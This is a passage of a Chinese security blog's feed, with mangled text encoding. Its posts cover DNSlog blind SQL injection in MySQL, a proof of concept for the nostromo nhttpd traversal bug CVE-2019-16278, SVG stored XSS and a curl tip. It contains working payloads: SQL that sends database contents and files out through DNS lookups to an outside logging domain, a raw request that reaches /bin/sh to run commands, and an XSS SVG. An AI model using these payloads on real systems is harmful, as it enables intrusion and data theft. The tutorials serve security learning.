    <content type="html"><![CDATA[<!-- toc --><ul><li><a href="#0x00-ä¸ºä»€ä¹ˆç”¨dnslogç›²æ³¨">0x00 ä¸ºä»€ä¹ˆç”¨Dnslogç›²æ³¨</a></li><li><a href="#0x01-åˆ©ç”¨æ¡ä»¶">0x01 åˆ©ç”¨æ¡ä»¶</a></li><li><a href="#0x02-å¦‚ä½•æŸ¥çœ‹mysqlæ˜¯å¦å¼€å¯äº†æ–‡ä»¶å¯¼å…¥å¯¼å‡º">0x02 å¦‚ä½•æŸ¥çœ‹mysqlæ˜¯å¦å¼€å¯äº†æ–‡ä»¶å¯¼å…¥å¯¼å‡ºï¼Ÿ</a></li><li><a href="#0x03-æ„é€ æ”»å‡»payload">0x03 æ„é€ æ”»å‡»Payload</a></li><li><a href="#0x04-reference">0X04 Reference</a></li></ul><!-- tocstop --><h2><span id="0x00-ä¸ºä»€ä¹ˆç”¨dnslogç›²æ³¨">0x00 ä¸ºä»€ä¹ˆç”¨Dnslogç›²æ³¨</span></h2><ul><li>å¯¹äºSQLç›²æ³¨ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡å¸ƒå°”æˆ–è€…æ—¶é—´ç›²æ³¨è·å–å†…å®¹ï¼Œä½†æ˜¯æ•´ä¸ªè¿‡ç¨‹æ•ˆç‡ä½ï¼Œéœ€è¦å‘é€å¾ˆå¤šçš„è¯·æ±‚è¿›è¡Œåˆ¤æ–­ï¼Œå®¹æ˜“è§¦å‘å®‰å…¨è®¾å¤‡çš„é˜²æŠ¤ï¼ŒDnslogç›²æ³¨å¯ä»¥å‡å°‘å‘é€çš„è¯·æ±‚ï¼Œç›´æ¥å›æ˜¾æ•°æ®å®ç°æ³¨å…¥ã€‚<br><img src="http://pic.c1imber.top/blog/180630/8aC6fb4hHB.png?imageslim" alt></li></ul><h2><span id="0x01-åˆ©ç”¨æ¡ä»¶">0x01 åˆ©ç”¨æ¡ä»¶</span></h2><ul><li><p>æ•°æ®åº“çš„load_fileå‡½æ•°å¿…é¡»å¯ç”¨ï¼Œä¹Ÿå°±æ˜¯æ•°æ®åº“ç”¨æˆ·å¿…é¡»è¦æœ‰file_privæƒé™</p></li><li><p>å…¶æ¬¡å°±æ˜¯mysqlçš„secure_file_privä¸ä¸ºNULL,æœ‰äº›é«˜ç‰ˆæœ¬çš„mysqlä¸­çš„secure_file_privé»˜è®¤ä¸ºNULL</p><ul><li>secure_file_privç‰¹æ€§secure_file_privå‚æ•°æ˜¯ç”¨æ¥é™åˆ¶LOAD DATA, SELECT â€¦ OUTFILE, and LOAD_FILE()ä¼ åˆ°å“ªä¸ªæŒ‡å®šç›®å½•çš„ã€‚</li></ul></li></ul><h2><span id="0x02-å¦‚ä½•æŸ¥çœ‹mysqlæ˜¯å¦å¼€å¯äº†æ–‡ä»¶å¯¼å…¥å¯¼å‡º">0x02 å¦‚ä½•æŸ¥çœ‹mysqlæ˜¯å¦å¼€å¯äº†æ–‡ä»¶å¯¼å…¥å¯¼å‡ºï¼Ÿ</span></h2><ul><li><p>åœ¨MySQL 5.5.53ç‰ˆæœ¬ä¹‹å‰ï¼Œè¿™ä¸ªå˜é‡é»˜è®¤ä¸ºç©ºï¼Œå› æ­¤æˆ‘ä»¬å°±å¯ä»¥ä½¿ç”¨è¿™äº›å‡½æ•°ã€‚ä½†æ˜¯åœ¨è¯¥ç‰ˆæœ¬ä¹‹åï¼ŒNULLå€¼ä¼šç¦ç”¨è¿™äº›å‡½æ•°ã€‚æˆ‘ä»¬å¯ä½¿ç”¨å…¶ä¸­çš„ä¸€ç§æ–¹æ³•æ¥æ£€æŸ¥è¿™ä¸ªå˜é‡çš„å€¼ã€‚Secure_file_privæ˜¯ä¸€ä¸ªå…¨å±€å˜é‡ä¸”æ˜¯ä¸€ä¸ªåªè¯»å˜é‡ï¼Œä¹Ÿå°±æ˜¯è¯´åœ¨è¿è¡Œæ—¶æ— æ³•æ›´æ”¹ã€‚</p></li><li><p>ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤æŸ¥çœ‹ï¼š</p><ul><li><p>mysql&gt;show global variables like â€˜%secure%â€™;</p></li><li><p>secure_file_privçš„å€¼ä¸ºnull ï¼Œè¡¨ç¤ºé™åˆ¶mysqld ä¸å…è®¸å¯¼å…¥|å¯¼å‡ºã€‚</p><ul><li>å½“secure_file_privçš„å€¼ä¸º/tmp/ ï¼Œè¡¨ç¤ºé™åˆ¶mysqld çš„å¯¼å…¥|å¯¼å‡ºåªèƒ½å‘ç”Ÿåœ¨/tmp/ç›®å½•ä¸‹ã€‚</li><li>å½“secure_file_privçš„å€¼æ²¡æœ‰å…·ä½“å€¼æ—¶ï¼Œè¡¨ç¤ºä¸å¯¹mysqld çš„å¯¼å…¥|å¯¼å‡ºåšé™åˆ¶ã€‚<br><img src="http://pic.c1imber.top/blog/180630/96ilB0fDlj.png?imageslim" alt></li></ul></li></ul></li></ul><ul><li><p>æ€»ç»“ä¸‹å¦‚ä½•ä¿®æ”¹secure_file_privçš„å€¼ï¼Ÿ</p><ul><li><p>windowsä¸‹ï¼šä¿®æ”¹my.ini åœ¨[mysqld]å†…åŠ å…¥secure_file_priv =</p></li><li><p>linuxä¸‹ï¼šä¿®æ”¹my.cnf åœ¨[mysqld]å†…åŠ å…¥secure_file_priv =</p></li><li><p>MYSQLæ–°ç‰¹æ€§secure_file_privå¯¹è¯»å†™æ–‡ä»¶çš„å½±å“</p></li><li><p>ç„¶åé‡å¯mysqlï¼Œå†æŸ¥è¯¢secure_file_priv</p><p>  <img src="http://pic.c1imber.top/blog/180630/mKDHhh4j1G.png?imageslim" alt></p></li></ul></li></ul><h2><span id="0x03-æ„é€ æ”»å‡»payload">0x03 æ„é€ æ”»å‡»Payload</span></h2><ul><li><p>æ™®é€špayloadï¼š</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">select load_file(concat(&apos;\\\\&apos;,(select database()),&apos;.xxxx.ceye.io\\abc&apos;))</span><br><span class="line">concatæ˜¯å­—ç¬¦ä¸²æ‹¼æ¥ï¼›</span><br><span class="line">ç”¨4ä¸ª,å› ä¸º\\ä¼šè¢«è½¬ä¹‰ä¸º:\</span><br><span class="line">database()å°±æ˜¯ä½ è¦åšSQLæ³¨å…¥æŸ¥è¯¢çš„åœ°æ–¹</span><br><span class="line">&apos;.xxxx.ceye.io\abc&apos;å°±æ˜¯ä½ çš„dnslogå¹³å°ç»™ä½ çš„åŸŸå</span><br><span class="line">uncè·¯å¾„ ç½‘ç»œå…±äº«æ–‡ä»¶æ–¹å¼ \\dnslog\abcè¿™æ ·çš„è·¯å¾„</span><br></pre></td></tr></table></figure></li></ul><pre><code>- ä¸Šé¢æ‹¼æ¥çš„ç»“æœå°±æ˜¯&quot;\\\\ schema_name.dnslog\\abc&quot;ï¼Œå…¶å®ç›¸å½“äºè®¿é—®äº†å¸¦æœ‰æ•°æ®åº“åç§°çš„ä¸‰çº§åŸŸåï¼Œè¢«dnslogæ•è·åˆ°äº†ã€‚</code></pre><ul><li><p>åŠ å¯†payload</p><ul><li><p>åˆ©ç”¨bur or select hex(â€œè¦åŠ å¯†çš„æ•°æ®â€)å³å¯.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">åŠ å¯†å‰ï¼š</span><br><span class="line">    select load_file(concat(&quot;\\\\&quot;,version(),&quot;.dnslog\\abc&quot;));</span><br><span class="line">16è¿›åˆ¶åŠ å¯†åï¼š</span><br><span class="line">    select load_file(concat(0x5c5c5c5c,version(),0x6xxf62312e7xxb2e307xx36363xx63635c5c616263));</span><br></pre></td></tr></table></figure><p><a href="https://imgchr.com/i/K1Xd56" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/10/22/K1Xd56.png" alt="K1Xd56.png"></a></p><p><a href="https://imgchr.com/i/K1XaUx" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/10/22/K1XaUx.png" alt="K1XaUx.png"></a></p></li></ul></li><li><p>è¯»é…ç½®æ–‡ä»¶payload</p><ul><li><p>è¿™é‡Œæ„é€ ä¸‹payloadè¯»å–ï¼šC:\phpStudy\WWW\phpinfo.php</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">é¦–å…ˆ</span><br><span class="line">select hex(&apos;C:\\phpStudy\\WWW\\phpinfo.php&apos;)</span><br><span class="line">å¾—åˆ°åŠ å¯†å­—ç¬¦ä¸²:433A5C70687053747564795C5757575C706870696E666F2E706870</span><br><span class="line"></span><br><span class="line">ç„¶åæ„é€ ä¸‹payload:</span><br><span class="line">select load_file(concat(0x5c5c5c5c,(select load_file(0x433A5C70687053747564795C5757575C706870696E666F2E706870)),0x6f6xxxxxx6b2e307xx363xxxxxc5c616263)); //è¿™é‡Œç”¨äº†ä¸¤ä¸ªload_fileå°±è§£å†³ä¸Šé¢æ‰€è¯´çš„é—®é¢˜äº†ã€‚</span><br><span class="line"></span><br><span class="line">ä½†æ˜¯ä½ è§‰å¾—ä¼šæˆåŠŸå— no no no</span><br><span class="line"></span><br><span class="line">å› ä¸ºæ–‡ä»¶å¸¦æœ‰æ¢è¡Œç¬¦è¿™æ˜¯ä¸ç¬¦åˆ åŸŸåè§„èŒƒçš„ é‚£ä¹ˆæˆ‘ä»¬æ€ä¹ˆåŠå‘¢ åŠ å¯†æ•°æ®å’¯</span><br><span class="line">ç”¨hex() ç»§ç»­æ„é€ payload:</span><br><span class="line"></span><br><span class="line">select load_file(concat(0x5c5c5c5c,hex((select load_file(0x433A5C70687053747564795C5757575C706870696E666F2E706870))),0x6f6f62xxxx66b2xxx78636xxxx5c5c616263));</span><br></pre></td></tr></table></figure></li><li><p>å¤ç°å¦‚ä¸‹å›¾ï¼š</p><p>  <a href="https://imgchr.com/i/K1jCL9" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/10/22/K1jCL9.png" alt="K1jCL9.png"></a><br>  <a href="https://imgchr.com/i/K1jpM4" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/10/22/K1jpM4.png" alt="K1jpM4.png"></a><br>  <a href="https://imgchr.com/i/K1j9sJ" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/10/22/K1j9sJ.png" alt="K1j9sJ.png"></a></p></li></ul></li></ul><h2><span id="0x04-reference">0X04 Reference</span></h2><pre><code>- å‚è€ƒé“¾æ¥ï¼š    https://xz.aliyun.com/t/3992#toc-1    https://www.freebuf.com/articles/web/201013.html    https://www.t00ls.net/thread-44273-1-1.html</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;!-- toc --&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#0x00-ä¸ºä»€ä¹ˆç”¨dnslogç›²æ³¨&quot;&gt;0x00 ä¸ºä»€ä¹ˆç”¨Dnslogç›²æ³¨&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#0x01-åˆ©ç”¨æ¡ä»¶&quot;&gt;0x01 åˆ©ç”¨æ¡ä»¶&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#0x0
      
    
    </summary>
    
    
      <category term="WEBå®‰å…¨" scheme="http://www.vkxss.top/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="WEBæ¸—é€æµ‹è¯•" scheme="http://www.vkxss.top/tags/WEB%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>nostromo nhttpd è·¯å¾„éå†æ¼æ´</title>
    <link href="http://www.vkxss.top/2019/10/17/CVE-2019-16278/"/>
    <id>http://www.vkxss.top/2019/10/17/CVE-2019-16278/</id>
    <published>2019-10-17T07:30:08.000Z</published>
    <updated>2019-10-17T07:32:00.814Z</updated>
    
    <content type="html"><![CDATA[<!-- toc --><ul><li><a href="#0x00-ç®€ä»‹">0X00 ç®€ä»‹</a></li><li><a href="#0x01-cveç¼–å·">0X01 CVEç¼–å·</a></li><li><a href="#0x02-æ¼æ´å¨èƒç­‰çº§">0X02 æ¼æ´å¨èƒç­‰çº§</a></li><li><a href="#0x03-å½±å“èŒƒå›´">0X03 å½±å“èŒƒå›´</a></li><li><a href="#0x04-æ¼æ´æè¿°">0X04 æ¼æ´æè¿°</a></li><li><a href="#0x05-æ¼æ´poc">0X05 æ¼æ´POC</a></li><li><a href="#0x06-æ¼æ´å¤ç°">0X06 æ¼æ´å¤ç°</a></li><li><a href="#0x07-ä¿®å¤å»ºè®®">0X07 ä¿®å¤å»ºè®®</a></li><li><a href="#0x08-reference">0X08 Reference</a></li></ul><!-- tocstop --><h2><span id="0x00-ç®€ä»‹">0X00 ç®€ä»‹</span></h2><ul><li><font face="å¾®è½¯é›…é»‘">nostromo nhttpdæ˜¯ä¸€æ¬¾å¼€æºçš„WebæœåŠ¡å™¨ã€‚ nostromo nhttpd 1.9.6åŠä¹‹å‰ç‰ˆæœ¬ä¸­çš„â€˜http_verifyâ€™å‡½æ•°å­˜åœ¨è·¯å¾„éå†æ¼æ´ã€‚è¯¥æ¼æ´æºäºç½‘ç»œç³»ç»Ÿæˆ–äº§å“æœªèƒ½æ­£ç¡®åœ°è¿‡æ»¤èµ„æºæˆ–æ–‡ä»¶è·¯å¾„ä¸­çš„ç‰¹æ®Šå…ƒç´ ã€‚æ”»å‡»è€…å¯åˆ©ç”¨è¯¥æ¼æ´è®¿é—®å—é™ç›®å½•ä¹‹å¤–çš„ä½ç½®ã€‚</font></li></ul><h2><span id="0x01-cveç¼–å·">0X01 CVEç¼–å·</span></h2><ul><li><font face="å¾®è½¯é›…é»‘">CVE-2019-16278</font></li></ul><h2><span id="0x02-æ¼æ´å¨èƒç­‰çº§">0X02 æ¼æ´å¨èƒç­‰çº§</span></h2><ul><li>é«˜å±</li></ul><h2><span id="0x03-å½±å“èŒƒå›´">0X03 å½±å“èŒƒå›´</span></h2><ul><li>nostromo nhttpd &lt;= 1.9.6</li></ul><h2><span id="0x04-æ¼æ´æè¿°">0X04 æ¼æ´æè¿°</span></h2><ul><li><font face="å¾®è½¯é›…é»‘">nostromo nhttpd 1.9.6åŠä¹‹å‰ç‰ˆæœ¬ä¸­çš„â€˜http_verifyâ€™å‡½æ•°å­˜åœ¨è·¯å¾„éå†æ¼æ´ã€‚è¯¥æ¼æ´æºäºç½‘ç»œç³»ç»Ÿæˆ–äº§å“æœªèƒ½æ­£ç¡®åœ°è¿‡æ»¤èµ„æºæˆ–æ–‡ä»¶è·¯å¾„ä¸­çš„ç‰¹æ®Šå…ƒç´ ã€‚æ”»å‡»è€…å¯åˆ©ç”¨è¯¥æ¼æ´è®¿é—®å—é™ç›®å½•ä¹‹å¤–çš„ä½ç½®ã€‚</font></li></ul><h2><span id="0x05-æ¼æ´poc">0X05 æ¼æ´POC</span></h2><ul><li><p>CVE-2019-16278.sh</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">POST /.%0d./.%0d./.%0d./.%0d./bin/sh HTTP/1.0</span><br><span class="line">Connection: close</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0</span><br><span class="line">Content-Length: 25</span><br><span class="line"></span><br><span class="line">   echo</span><br><span class="line">   echo</span><br><span class="line">   ifconfig 2&gt;&amp;1</span><br></pre></td></tr></table></figure></li></ul><h2><span id="0x06-æ¼æ´å¤ç°">0X06 æ¼æ´å¤ç°</span></h2><ul><li><p>è®°å½•ä¸€ä¸‹ï¼Œè¯·å‚è€ƒï¼š</p><ul><li><a href="https://github.com/vkbiu/CVE/tree/master/CVE-2019-16278" target="_blank" rel="noopener">https://github.com/vkbiu/CVE/tree/master/CVE-2019-16278</a></li></ul></li></ul><h2><span id="0x07-ä¿®å¤å»ºè®®">0X07 ä¿®å¤å»ºè®®</span></h2><ul><li><font face="å¾®è½¯é›…é»‘">ä¸Šwafæˆ–é˜²ç«å¢™é…ç½®è§„åˆ™æ‹¦æˆª,ç­‰å¾…å®˜æ–¹ä¿®å¤æ‰“è¡¥ä¸ã€‚</font></li></ul><h2><span id="0x08-reference">0X08 Reference</span></h2><ul><li><p>å‚è€ƒé“¾æ¥ï¼š</p><ul><li><a href="http://www.cnnvd.org.cn/web/xxk/ldxqById.tag?CNNVD=CNNVD-201910-807" target="_blank" rel="noopener">http://www.cnnvd.org.cn/web/xxk/ldxqById.tag?CNNVD=CNNVD-201910-807</a></li><li><a href="https://git.sp0re.sh/sp0re/Nhttpd-exploits" target="_blank" rel="noopener">https://git.sp0re.sh/sp0re/Nhttpd-exploits</a></li></ul></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;!-- toc --&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#0x00-ç®€ä»‹&quot;&gt;0X00 ç®€ä»‹&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#0x01-cveç¼–å·&quot;&gt;0X01 CVEç¼–å·&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#0x02-æ¼æ´å¨èƒç­‰çº§&quot;&gt;0X02 æ¼æ´å¨
      
    
    </summary>
    
    
      <category term="CVE-2019" scheme="http://www.vkxss.top/categories/CVE-2019/"/>
    
    
      <category term="CVE-2019-16278" scheme="http://www.vkxss.top/tags/CVE-2019-16278/"/>
    
  </entry>
  
  <entry>
    <title>SVG-XSS</title>
    <link href="http://www.vkxss.top/2019/10/11/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-SVG-XSS/"/>
    <id>http://www.vkxss.top/2019/10/11/æ¸—é€æµ‹è¯•-SVG-XSS/</id>
    <published>2019-10-11T07:30:08.000Z</published>
    <updated>2019-10-11T10:38:58.307Z</updated>
    
    <content type="html"><![CDATA[<!-- toc --><ul><li><a href="#svg-xss">SVG-XSS</a><ul><li><a href="#ä»‹ç»">ä»‹ç»</a></li><li><a href="#svgæ–‡ä»¶">SVGæ–‡ä»¶</a></li><li><a href="#xss-payload">Xss Payload</a></li></ul></li></ul><!-- tocstop --><h1><span id="svg-xss">SVG-XSS</span></h1><h2><span id="ä»‹ç»">ä»‹ç»</span></h2><ul><li>è·¨ç«™ç‚¹è„šæœ¬ï¼ˆXSSï¼‰æ˜¯ä¸€ä¸ªéå¸¸å¸¸è§çš„æ¼æ´ï¼Œæ¶‰åŠåœ¨ç½‘é¡µä¸­æ³¨å…¥javascriptä»£ç ã€‚ä»çªƒå–ç”¨æˆ·Cookieåˆ°é€šè¿‡CORSç»•è¿‡SOPï¼Œæ­¤æ¼æ´å¯ç”¨äºæ‰§è¡Œå„ç§æ“ä½œã€‚æœ‰è®¸å¤šæ–¹æ³•å¯ä»¥å®šä½XSSæ¼æ´ï¼Œé€šå¸¸ä¼šå¿½ç•¥SVGæ–‡ä»¶ã€‚</li></ul><h2><span id="svgæ–‡ä»¶">SVGæ–‡ä»¶</span></h2><ul><li><p>å¯ç¼©æ”¾çŸ¢é‡å›¾å½¢ï¼ˆSVGï¼‰æ˜¯ç”¨äºäºŒç»´å›¾å½¢çš„åŸºäºXMLçš„çŸ¢é‡å›¾åƒæ ¼å¼ï¼Œå¹¶æ”¯æŒäº¤äº’æ€§å’ŒåŠ¨ç”»ã€‚</p></li><li><p>ä»¥ä¸‹ä»£ç æ˜¯åŸºæœ¬SVGæ–‡ä»¶çš„ç¤ºä¾‹ï¼š</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg version=&quot;1.1&quot; baseProfile=&quot;full&quot; xmlns=&quot;http://www.w3.org/2000/svg&quot;&gt;</span><br><span class="line">   &lt;polygon id=&quot;triangle&quot; points=&quot;0,0 0,50 50,0&quot; fill=&quot;#009900&quot; stroke=&quot;#004400&quot;/&gt;</span><br><span class="line">&lt;/svg&gt;</span><br></pre></td></tr></table></figure></li><li><p>SVGæ–‡ä»¶è¿˜æ”¯æŒåµŒå…¥å¼javascriptä»£ç ã€‚ä¾‹å¦‚ï¼Œå¼€å‘äººå‘˜å¯èƒ½åœ¨svgå›¾åƒä¸­ä½¿ç”¨javascriptï¼Œä»¥ä¾¿ä»–ä»¬å¯ä»¥å®æ—¶è¿›è¡Œæ“ä½œã€‚è¿™å¯ä»¥ç”¨äºåŠ¨ç”»å’Œå…¶ä»–ä»»åŠ¡ã€‚</p></li><li><p>è¦æ³¨æ„çš„å¦ä¸€ä»¶äº‹æ˜¯ï¼ŒSVGæ–‡ä»¶å¯ä»¥è§†ä¸ºHTMLä¸­çš„å›¾åƒã€‚è¿™æ„å‘³ç€æ‚¨å¯ä»¥å°†SVGæ–‡ä»¶æ”¾ç½®åœ¨å›¾åƒæ ‡ç­¾ä¸­ï¼Œå¹¶ä¸”å¯ä»¥å®Œç¾å‘ˆç°ï¼š</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;rectangle.svg&quot; alt=&quot;Rectangle&quot; height=&quot;42&quot; width=&quot;42&quot;&gt;</span><br></pre></td></tr></table></figure></li></ul><h2><span id="xss-payload">Xss Payload</span></h2><ul><li><p>å¦‚æœç½‘ç«™ä½¿ç”¨XSSæœ‰æ•ˆè´Ÿè½½åŠ è½½SVGæ–‡ä»¶ï¼Œåˆ™å°†æ‰§è¡Œè¯¥æ–‡ä»¶ã€‚å¼€å‘äººå‘˜å’Œæ”»å‡»è€…éƒ½ç»å¸¸å¿½è§†è¿™ä¸€ç‚¹ã€‚ä»¥ä¸‹æ˜¯å¸¦æœ‰è­¦æŠ¥XSSæœ‰æ•ˆè´Ÿè½½çš„SVGæ–‡ä»¶ç¤ºä¾‹ï¼š</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; standalone=&quot;no&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE svg PUBLIC &quot;-//W3C//DTD SVG 1.1//EN&quot; &quot;http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;svg version=&quot;1.1&quot; baseProfile=&quot;full&quot; xmlns=&quot;http://www.w3.org/2000/svg&quot;&gt;</span><br><span class="line">   &lt;polygon id=&quot;triangle&quot; points=&quot;0,0 0,50 50,0&quot; fill=&quot;#009900&quot; stroke=&quot;#004400&quot;/&gt;</span><br><span class="line">  &lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">    alert(&quot;SVG XSS&quot;);</span><br><span class="line">  &lt;/script&gt;</span><br><span class="line">&lt;/svg&gt;</span><br></pre></td></tr></table></figure></li><li><p>ä¸Šä¼ æ—¶ï¼Œæ³¨æ„å†…å®¹ç±»å‹è®¾ç½®ä¸ºï¼šContent-Type: image/svg+xml</p></li><li><p>ä¸Šä¼ å›¾åƒåï¼Œæ‚¨åªéœ€æ‰¾å‡ºå›¾åƒä¸Šè½½åˆ°çš„è·¯å¾„å³å¯ã€‚å¦‚æœæ‚¨ä½¿ç”¨çš„æ˜¯Google chromeï¼Œåˆ™å¯ä»¥é€šè¿‡å³é”®å•å‡»å›¾ç‰‡å¹¶é€‰æ‹©â€œå¤åˆ¶å›¾ç‰‡åœ°å€â€æ¥è½»æ¾å®Œæˆæ­¤æ“ä½œã€‚å¦‚æœåœ¨æŸ¥çœ‹å›¾åƒæ—¶ä¸€åˆ‡æ­£å¸¸ï¼Œåˆ™å°†æ‰§è¡Œæœ‰æ•ˆè´Ÿè½½ã€‚æ‚¨åªæ˜¯é€šè¿‡SVGæ–‡ä»¶å­˜å‚¨äº†XSSã€‚<br><font face="å¾®è½¯é›…é»‘"><center><img src="https://ae01.alicdn.com/kf/H0dbdab236e1c460ebd3f3fe412c09d94k.png" style="zoom:50%"></center></font></p></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;!-- toc --&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#svg-xss&quot;&gt;SVG-XSS&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#ä»‹ç»&quot;&gt;ä»‹ç»&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#svgæ–‡ä»¶&quot;&gt;SVGæ–‡ä»¶&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#xs
      
    
    </summary>
    
    
      <category term="WEBå®‰å…¨" scheme="http://www.vkxss.top/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="WEBæ¸—é€æµ‹è¯•" scheme="http://www.vkxss.top/tags/WEB%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>æ¥å£å¿«é€Ÿæµ‹è¯•å°æŠ€å·§(Python)</title>
    <link href="http://www.vkxss.top/2019/10/11/%E6%8E%A5%E5%8F%A3%E5%BF%AB%E9%80%9F%E6%B5%8B%E8%AF%95%E5%B0%8F%E6%8A%80%E5%B7%A7(Python)/"/>
    <id>http://www.vkxss.top/2019/10/11/æ¥å£å¿«é€Ÿæµ‹è¯•å°æŠ€å·§(Python)/</id>
    <published>2019-10-11T07:30:08.000Z</published>
    <updated>2019-10-16T02:30:11.452Z</updated>
    
    <content type="html"><![CDATA[<h2><span id="æ¥å£å¿«é€Ÿæµ‹è¯•å°æŠ€å·§python">æ¥å£å¿«é€Ÿæµ‹è¯•å°æŠ€å·§(Python)</span></h2><ul><li><p><font face="å¾®è½¯é›…é»‘">ç»ˆäºæ‰¾åˆ°è§£å†³æˆ‘æ¯æ¬¡å†™è¯·æ±‚å¤´ä¸åœå¤åˆ¶ç²˜è´´ï¼Œæ”¹æ ¼å¼ã€‚ä¹‹åæˆ‘ä»¬å¯ä»¥è¿™æ ·ï¼Œæé«˜äº†æµ‹è¯•çš„æ•ˆç‡ï¼Œå…å¾—é‡å¤é€ è½®å­ï¼Œä¸åªæ˜¯æ”¯æŒpythonï¼Œè€Œä¸”è¿˜æ”¯æŒå¤šç§ç¼–ç¨‹è¯­è¨€è½¬æ¢ã€‚ğŸ‚ğŸº</font></p></li><li><p><font face="å¾®è½¯é›…é»‘">ç½‘ç«™ï¼š<a href="https://curl.trillworks.com" target="_blank" rel="noopener">https://curl.trillworks.com</a></font></p><p>  <a href="https://imgchr.com/i/KieFSA" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/10/16/KieFSA.png" alt="KieFSA.png"></a></p><p>  <a href="https://imgchr.com/i/KieEOP" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/10/16/KieEOP.png" alt="KieEOP.png"></a></p></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2&gt;&lt;span id=&quot;æ¥å£å¿«é€Ÿæµ‹è¯•å°æŠ€å·§python&quot;&gt;æ¥å£å¿«é€Ÿæµ‹è¯•å°æŠ€å·§(Python)&lt;/span&gt;&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;font face=&quot;å¾®è½¯é›…é»‘&quot;&gt;ç»ˆäºæ‰¾åˆ°è§£å†³æˆ‘æ¯æ¬¡å†™è¯·æ±‚å¤´ä¸åœå¤åˆ¶ç²˜è´´ï¼Œæ”¹æ ¼å¼ã€‚ä¹‹åæˆ‘ä»¬å¯ä»¥è¿™æ ·ï¼Œæé«˜äº†æµ‹è¯•çš„æ•ˆç‡ï¼Œå…å¾—é‡å¤é€ è½®å­ï¼Œ
      
    
    </summary>
    
    
      <category term="python" scheme="http://www.vkxss.top/categories/python/"/>
    
    
      <category term="WEBæ¸—é€æµ‹è¯•" scheme="http://www.vkxss.top/tags/WEB%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2019-13272-Linuxæœ¬åœ°ææƒæ¼æ´</title>
    <link href="http://www.vkxss.top/2019/10/08/CVE-2019-13272/"/>
    <id>http://www.vkxss.top/2019/10/08/CVE-2019-13272/</id>
    <published>2019-10-08T07:30:08.000Z</published>
    <updated>2019-10-09T08:00:57.618Z</updated>
    
